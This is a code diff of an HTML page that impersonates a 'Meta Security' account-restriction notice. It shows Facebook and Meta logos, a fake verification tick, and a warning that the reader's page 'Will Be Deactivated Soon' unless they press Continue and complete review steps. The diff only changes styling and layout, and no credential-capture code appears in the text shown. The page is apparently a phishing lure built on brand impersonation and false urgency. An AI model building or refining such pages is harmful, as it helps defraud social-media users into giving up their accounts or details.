@@ -2,111 +2,146 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Meta Security Notice</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meta Security</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
+      background: #f0f2f5;
       font-family: Arial, sans-serif;
-      background-color: #f1f1f1;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
+
     .container {
-      background-color: #fff;
-      padding: 30px;
-      width: 350px;
-      text-align: center;
+      background-color: white;
+      padding: 25px;
+      width: 90%;
+      max-width: 420px;
       border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
       position: relative;
     }
-    .top-logo {
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .logo-title {
       display: flex;
       align-items: center;
-      justify-content: flex-start;
-      margin-bottom: 20px;
     }
-    .top-logo img {
-      width: 30px;
-      height: 30px;
+
+    .logo-title img {
+      width: 32px;
+      height: 32px;
       margin-right: 10px;
     }
-    .main-icon {
-      width: 100px;
-      margin: 20px auto;
-    }
-    .heading {
+
+    .logo-title .title {
       font-size: 20px;
       font-weight: bold;
     }
-    .subheading {
-      font-size: 16px;
-      color: #333;
+
+    .meta-right-logo {
+      width: 32px;
+      height: auto;
     }
-    .tick-text {
+
+    .subheading {
+      font-size: 15px;
+      margin-bottom: 10px;
       display: inline-flex;
       align-items: center;
-      justify-content: center;
-      margin-top: 10px;
-      font-size: 14px;
-      color: #555;
+      gap: 5px;
+      color: #333;
     }
-    .tick-text img {
+
+    .subheading img {
       width: 16px;
       height: 16px;
-      margin-left: 5px;
     }
+
     .warning {
       color: red;
       font-weight: bold;
-      margin-top: 20px;
-    }
-    .info-text {
-      font-size: 14px;
-      margin: 15px 0;
-    }
-    .btn {
-      background-color: #1877f2;
-      color: #fff;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 6px;
-      cursor: pointer;
+      margin: 15px 0 10px;
       font-size: 16px;
     }
-    .footer-links {
-      margin-top: 20px;
-      font-size: 12px;
+
+    .info-text {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 20px;
     }
+
+    .btn {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 25px;
+      font-size: 15px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .footer-links {
+      font-size: 12px;
+      margin-top: 20px;
+      color: #888;
+    }
+
     .footer-links a {
       margin: 0 5px;
       color: #555;
       text-decoration: none;
+    }
+
+    @media (max-width: 400px) {
+      .container {
+        padding: 20px 15px;
+      }
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="top-logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
-    <span class="heading">Meta Security</span>
+  <!-- Top bar with left logo and right Meta logo -->
+  <div class="top-bar">
+    <div class="logo-title">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+      <div class="title">Meta Security</div>
+    </div>
+    <img class="meta-right-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo.svg" alt="Meta Logo Right">
   </div>
-  <div class="subheading tick-text">
+
+  <!-- Subheading with Blue Tick -->
+  <div class="subheading">
     Account Restrictions Service
     <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Blue Tick">
   </div>
 
-  <img src="https://cdn-icons-png.flaticon.com/512/545/545705.png" alt="Main Icon" class="main-icon">
-
+  <!-- Warning Text -->
   <div class="warning">Your Page Will Be Deactivated Soon</div>
+
+  <!-- Info Text -->
   <div class="info-text">
     We will walk you through several steps to request a review.<br>
     You should complete these steps so that your page will not be deleted permanently.
   </div>
+
+  <!-- Continue Button -->
   <button class="btn">Continue</button>
 
+  <!-- Footer Links -->
   <div class="footer-links">
     <a href="#">Terms of Service</a> |
     <a href="#">Privacy Policy</a> |
